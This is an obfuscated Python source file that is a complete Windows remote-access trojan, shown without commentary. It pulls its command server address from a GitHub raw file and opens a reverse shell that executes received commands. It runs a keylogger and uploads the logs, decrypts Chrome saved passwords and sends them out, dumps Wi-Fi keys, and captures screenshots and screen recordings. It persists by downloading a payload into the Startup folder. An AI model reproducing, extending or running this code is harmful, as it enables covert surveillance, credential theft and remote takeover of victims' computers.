import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
rvhMSdWqeHMgWZlfrrrH = ""
gCfXiGFfJTYeudrQwxnD = ""
FzirTOIISUMQDLFrczVi = "17.12.24.3"
ANCKJfyJKvacSHJ = "!"
gPkwDOvmalgbazgxEf = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
GFmTEHHigvDPKnQZFVkbOYC = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
lRxYdDgJUuPUSeAfOvGBk = os.path.expanduser("~\\AppData\\Local\\")
def atrPQQth(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def XHTuYrWvRYpfUMZLTtULPV(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	dQdoGLSYPKsgmSLmsJEv = data.decode("utf-8").replace("\n","")
	if not dQdoGLSYPKsgmSLmsJEv.startswith(ANCKJfyJKvacSHJ):
		proc = subprocess.run(dQdoGLSYPKsgmSLmsJEv, shell=True, capture_output=True)
		yFtJYmDMSybS = proc.stdout + proc.stderr
		s.send(yFtJYmDMSybS)
		return
	mcKliNAZdggNPgCQDMWYoIl = dQdoGLSYPKsgmSLmsJEv.split(" ")[0][1:]
	args = " ".join(dQdoGLSYPKsgmSLmsJEv.split()[1:]).split()
	if mcKliNAZdggNPgCQDMWYoIl == "download":
		KEvKzhQyCpeiEY(s, dQdoGLSYPKsgmSLmsJEv)
	elif mcKliNAZdggNPgCQDMWYoIl == "screenshot":
		oECvOWjpRxbIMOpZQFfH(s)
	elif mcKliNAZdggNPgCQDMWYoIl == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif mcKliNAZdggNPgCQDMWYoIl == "update":
		McQYRaMQe(s)
	elif mcKliNAZdggNPgCQDMWYoIl == "wifi":
		ujPzTlukEW(s)
	elif mcKliNAZdggNPgCQDMWYoIl == "screenrecord":
		DVNFfkJRIXiqNLWroNI(s, args)
	elif mcKliNAZdggNPgCQDMWYoIl == "chrome":
		decryptPasswords(s)
def KEvKzhQyCpeiEY(s, dQdoGLSYPKsgmSLmsJEv):
	cbqJYGtYXqEDlL = dQdoGLSYPKsgmSLmsJEv.replace(ANCKJfyJKvacSHJ+"download ","").split(",")
	yFtJYmDMSybSs = ""
	for f in cbqJYGtYXqEDlL:
		yFtJYmDMSybSs += KXoAGlYwrM(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(yFtJYmDMSybSs, "utf-8"))
def oECvOWjpRxbIMOpZQFfH(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	zQbsZLhMxKtrZ = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(zQbsZLhMxKtrZ)
	image.close()
	r = KXoAGlYwrM(zQbsZLhMxKtrZ, "api/sscap")
	os.remove(zQbsZLhMxKtrZ)
	s.send(bytes(r,"utf-8"))
def DVNFfkJRIXiqNLWroNI(s, args):
	QtpNdhcQjqmeEeLVH = 15
	if not args == []:
		try: QtpNdhcQjqmeEeLVH = int(args[0])
		except: pass
	ptYIZYDRLKIAce = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	cmMyCJhxCzoUaWyrzcyGqxC = []
	fps = 11
	numFrames = QtpNdhcQjqmeEeLVH * fps
	for _ in range(numFrames):
		cmMyCJhxCzoUaWyrzcyGqxC.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(ptYIZYDRLKIAce, cmMyCJhxCzoUaWyrzcyGqxC, fps=fps, quality=8)
	KXoAGlYwrM(ptYIZYDRLKIAce, "api/screc")
def KXoAGlYwrM(KylJeozXTgVKoVIUFzt, PSbYGCXywBuQqrpazrrFmuC, xusISQpwCcjmejvZ=None):
	if not os.path.isfile(KylJeozXTgVKoVIUFzt):
		return "[!] 404: "+KylJeozXTgVKoVIUFzt+"\n"
	headers = {"user":os.getlogin()}
	if xusISQpwCcjmejvZ is not None:
		headers = {**headers, **xusISQpwCcjmejvZ}
	f = open(KylJeozXTgVKoVIUFzt, "rb")
	requests.post("http://"+rvhMSdWqeHMgWZlfrrrH+":5555/"+PSbYGCXywBuQqrpazrrFmuC,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(dataToSend, PSbYGCXywBuQqrpazrrFmuC):
	if dataToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+rvhMSdWqeHMgWZlfrrrH+":5555/"+PSbYGCXywBuQqrpazrrFmuC,
		data=dataToSend,
		headers={"user":os.getlogin()});
	return "[+] 200\n"
def McQYRaMQe(s):
	h, p, v = zREMSXCxBZzcwLYeayJQKBP(True)
	if (v != FzirTOIISUMQDLFrczVi):
		eUEvTGPThjyynCNITGUFdo(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def ujPzTlukEW(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	hzdGYaYteRrJ = ""
	for p in profiles:
		try: hzdGYaYteRrJ+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: hzdGYaYteRrJ+=f"    {p} - N/A\n"
	s.send(bytes(hzdGYaYteRrJ, "utf-8"))
def eUEvTGPThjyynCNITGUFdo(OiFaJNtJvJOdSj):
	TTRArxmzicsbZHNHTwdbx = os.path.basename(__file__)
	fileType = TTRArxmzicsbZHNHTwdbx.split(".")[-1]
	kTmXBtBilhWZCCGJjKihkp = TTRArxmzicsbZHNHTwdbx.split(".")[0]+"."+OiFaJNtJvJOdSj+".pyw" if fileType.startswith("py") else ".exe"
	rJQsSiKiIknRZMFpFaqCy = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), kTmXBtBilhWZCCGJjKihkp)
	if not os.path.isfile(rJQsSiKiIknRZMFpFaqCy):
		with open(rJQsSiKiIknRZMFpFaqCy, "w+") as f:
			f.write(requests.get(GFmTEHHigvDPKnQZFVkbOYC+"file."+ "pyw" if rJQsSiKiIknRZMFpFaqCy.split(".")[-1].startswith("py") else "exe").text)
def zREMSXCxBZzcwLYeayJQKBP(force=False):
	global rvhMSdWqeHMgWZlfrrrH, gCfXiGFfJTYeudrQwxnD
	if force or rvhMSdWqeHMgWZlfrrrH == "" or gCfXiGFfJTYeudrQwxnD == "":
		data = requests.get(gPkwDOvmalgbazgxEf).text.replace("\n","").split(":")
		rvhMSdWqeHMgWZlfrrrH = data[0].strip()
		gCfXiGFfJTYeudrQwxnD = data[1].strip()
		OiFaJNtJvJOdSj = data[2].strip()
	return rvhMSdWqeHMgWZlfrrrH, gCfXiGFfJTYeudrQwxnD, OiFaJNtJvJOdSj
def nBoUIQhoqioIeXyjGxudqhD():
	try:
		BhOvRhzDjQwYLR = "settings.xpb"
		ihvvOPyd = sorted([file for file in os.listdir(lRxYdDgJUuPUSeAfOvGBk) if os.path.isfile(lRxYdDgJUuPUSeAfOvGBk+"\\"+file) and file.endswith(BhOvRhzDjQwYLR.split(".")[-1])])
		if BhOvRhzDjQwYLR in ihvvOPyd:
			ihvvOPyd.remove(BhOvRhzDjQwYLR)
		dbdWTjHPifqlTmzbbriog = os.path.join(lRxYdDgJUuPUSeAfOvGBk,BhOvRhzDjQwYLR)
		if len(ihvvOPyd) > 0:
			with open(dbdWTjHPifqlTmzbbriog, "ab+") as f:
				for file in ihvvOPyd:
					temp = os.path.join(lRxYdDgJUuPUSeAfOvGBk,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		KXoAGlYwrM(dbdWTjHPifqlTmzbbriog, "api/log")
		if os.path.isfile(dbdWTjHPifqlTmzbbriog):
			os.remove(dbdWTjHPifqlTmzbbriog)
	except:
		pass
def sutNCdgoPVweQK():
	logging.basicConfig(filename=(lRxYdDgJUuPUSeAfOvGBk+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def DIjIEcblSqukeuNEHLqnE(k):
		logging.info(str(k))
	k=Listener(on_press=DIjIEcblSqukeuNEHLqnE)
	UmNiJgHHOxGoceABHScEg = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in UmNiJgHHOxGoceABHScEg:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s, upload=False):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	data = "\n"
	for login in logins:
		data += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	if not upload:
		s.send(bytes(data,"utf-8"))
	else:
		r=uploadData(data, "api/google")
		s.send(bytes(r,"utf-8"))
def ColXGxHLIC():
	h, p, v = zREMSXCxBZzcwLYeayJQKBP()
	nBoUIQhoqioIeXyjGxudqhD()
	decryptPasswords(None,True)
	if FzirTOIISUMQDLFrczVi != v:
		eUEvTGPThjyynCNITGUFdo(v)
	sutNCdgoPVweQK()
	IFsIFgIdBGMglg = bytes(("(old)"if FzirTOIISUMQDLFrczVi!=v else "")+"["+FzirTOIISUMQDLFrczVi+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				rlFqTVUMOZE=False
				try:
					s=atrPQQth(h, p)
					while not rlFqTVUMOZE:
						s.send(IFsIFgIdBGMglg)
						rlFqTVUMOZE=XHTuYrWvRYpfUMZLTtULPV(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ColXGxHLIC()
